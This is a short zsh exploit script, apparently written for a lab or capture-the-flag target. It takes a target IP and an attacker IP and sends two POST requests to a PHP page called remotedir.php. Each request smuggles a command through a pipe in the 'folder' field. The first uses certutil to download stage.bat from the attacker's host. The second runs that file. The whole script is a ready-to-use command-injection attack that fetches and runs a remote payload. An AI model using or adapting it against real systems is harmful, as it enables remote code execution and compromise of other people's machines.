#!/bin/zsh
if [[ $# -ne 2 ]]; then
    echo "ERR: Need two arguments"
    echo "Usage: $0 <target IP> <source IP>"
    exit 2
fi
curl -X POST --data-binary $'folder=C%3A%5CWindows%7Ccertutil.exe+-urlcache+-f+http%3A%2F%2F'$2'%3A8000%2Fstage.bat+stage.bat&submit=Submit' http://$1/extram/remotedir.php
curl -X POST --data-binary $'folder=C%3A%5CWindows%7Cstage.bat&submit=Submit' http://$1/extram/remotedir.php

